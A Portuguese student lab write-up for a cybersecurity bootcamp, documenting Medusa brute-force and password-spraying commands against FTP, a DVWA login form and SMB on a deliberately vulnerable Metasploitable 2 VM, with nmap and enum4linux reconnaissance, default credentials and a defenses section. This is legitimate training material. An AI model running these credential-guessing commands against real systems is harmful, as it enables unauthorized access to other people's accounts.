# Ataques de Força Bruta com Medusa (Kali Linux)

Esse é o meu projeto do desafio do curso **Santander - Cibersegurança do Zero à Prática (DIO)**.

To começando agora na área de segurança, então a ideia aqui não é ser especialista, e sim mostrar o que eu entendi sobre ataques de força bruta e, principalmente, como se proteger deles. Montei a documentação testando os comandos no **Medusa** contra o **Metasploitable 2**, que é uma máquina virtual feita de propósito pra ser vulnerável e servir de laboratório.

> Aviso: tudo isso foi feito num laboratório isolado, só pra estudar. Fazer isso em sistema de outra pessoa sem autorização é crime.

---

## O que é força bruta

Força bruta é basicamente ficar tentando adivinhar uma senha até acertar. A ferramenta vai testando várias combinações de usuário e senha automaticamente.

Dá pra fazer de jeitos diferentes:

- **Ataque de dicionário:** em vez de testar tudo, uso uma lista de senhas que as pessoas costumam usar (wordlist). É o mais comum.
- **Password spraying:** testo uma senha comum em vários usuários de uma vez. A vantagem é não ficar errando mil vezes o mesmo usuário, o que evita bloquear a conta.

Uma coisa que eu percebi estudando isso: o ataque só funciona porque muita gente usa senha fraca ou deixa senha padrão. A ferramenta é só o último passo.

---

## Como montei o laboratório

Usei duas VMs no VirtualBox numa rede host-only (isolada, sem internet):

```
   KALI LINUX                      METASPLOITABLE 2
   (quem ataca)      ------->      (o alvo vulnerável)
   192.168.56.101                  192.168.56.102
                                     porta 21  -> FTP
                                     porta 80  -> site com DVWA
                                     porta 445 -> SMB
```

Escolhi o Metasploitable 2 porque ele já vem com FTP, o site do DVWA e o SMB tudo junto, então deu pra fazer os três cenários numa VM só.

Pra descobrir o IP do alvo e ver quais serviços tão abertos, usei o nmap:

```bash
sudo nmap -sn 192.168.56.0/24     # acha os IPs da rede
sudo nmap -sV 192.168.56.102      # mostra os serviços abertos no alvo
```

Credenciais que já se sabe que existem no Metasploitable 2 (usei pra conferir se o ataque realmente achava a senha certa):

- FTP / sistema: `msfadmin` / `msfadmin`
- DVWA (site): `admin` / `password`

---

## Sobre o Medusa

O Medusa já vem instalado no Kali. Ele funciona com módulos, um pra cada tipo de serviço (ftp, http, smb...).

Parâmetros que mais usei:

- `-h` IP do alvo
- `-u` um usuário / `-U` lista de usuários
- `-p` uma senha / `-P` lista de senhas
- `-M` o módulo (ftp, http, smbnt...)
- `-f` para quando achar a senha certa

---

## Wordlists

Fiz duas listas pequenas (na pasta `wordlists`): uma de usuários e uma de senhas fracas. Coloquei nelas as senhas mais comuns e também as credenciais que eu já sabia do laboratório, pra garantir que o ataque fosse encontrar.

- `wordlists/users.txt`
- `wordlists/passwords.txt`

No Kali também já vem uma lista gigante chamada `rockyou.txt`, que é a que o pessoal usa de verdade.

---

## Cenário 1 - Força bruta no FTP

O FTP é um alvo fácil porque manda a senha em texto puro e não limita as tentativas.

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -f
```

Quando acha a senha, aparece uma linha assim:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## Cenário 2 - Força bruta no site (DVWA)

O DVWA é um site vulnerável de propósito, que serve pra treinar. Ele tem uma tela de login pra gente tentar quebrar.

Antes de rodar, entrei no DVWA (`admin` / `password`), deixei a segurança no nível **Low** e peguei o cookie da sessão no navegador.

```bash
medusa -h 192.168.56.102 -u admin -P wordlists/passwords.txt -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m FORM-DATA:"GET" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m CUSTOM-HEADER:"Cookie: security=low; PHPSESSID=<seu_phpsessid>"
```

O `DENY-SIGNAL` é a frase que aparece na tela quando a senha tá errada. É assim que o Medusa sabe diferenciar o acerto do erro.

Uma coisa que achei interessante: se eu mudo a segurança do DVWA de Low pra High, o ataque para de funcionar, porque o site passa a usar um token diferente a cada tentativa. Isso me ajudou a entender na prática por que essas proteções existem.

---

## Cenário 3 - Password spraying no SMB

Aqui eu primeiro precisei descobrir quais usuários existem. Pra isso usei o enum4linux:

```bash
enum4linux -U 192.168.56.102
```

Depois rodei o Medusa testando UMA senha em todos os usuários:

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -p "msfadmin" -M smbnt
```

A ideia é não ficar errando várias senhas no mesmo usuário, pra não bloquear a conta e chamar menos atenção.

---

## Conferindo se o acesso funciona

Achar a senha não é o fim, dá pra testar se ela realmente entra:

```bash
ftp 192.168.56.102          # loga com msfadmin / msfadmin e lista os arquivos
smbclient -L //192.168.56.102 -U msfadmin
```

---

## Como se proteger (a parte mais importante)

Estudando os ataques, deu pra entender o que realmente segura eles:

- **Senha forte e longa:** quanto maior, mais inviável fica a força bruta.
- **Usar 2 fatores (MFA):** mesmo que descubram a senha, falta o segundo código.
- **Limitar as tentativas:** travar o login depois de algumas falhas deixa o ataque lento demais pra valer a pena.
- **Tirar as senhas padrão:** `msfadmin/msfadmin` nunca deveria existir num sistema de verdade.
- **Trocar FTP por SFTP:** aí a senha não anda em texto puro na rede.

---

## O que eu aprendi

- A ferramenta é só o final de tudo. O que faz o ataque funcionar é senha fraca e senha padrão.
- Cada serviço precisa de um jeito diferente: o FTP cede fácil, o site depende de entender o formulário, e o SMB funciona melhor com spraying.
- Entender o ataque foi o que me ensinou a defesa. Ver o DVWA parar de ser quebrado no nível High explicou por que token, limite de tentativas e MFA são importantes.
- E o principal: isso só pode ser feito em laboratório próprio ou com autorização.

---

## Organização do repositório

```
desafio-medusa/
├── README.md
├── wordlists/
│   ├── users.txt
│   └── passwords.txt
├── scripts/
│   └── run_attacks.sh
└── images/            (prints, se eu colocar depois)
```

---

Projeto feito pro bootcamp **Santander - Cibersegurança do Zero à Prática** na **DIO**.
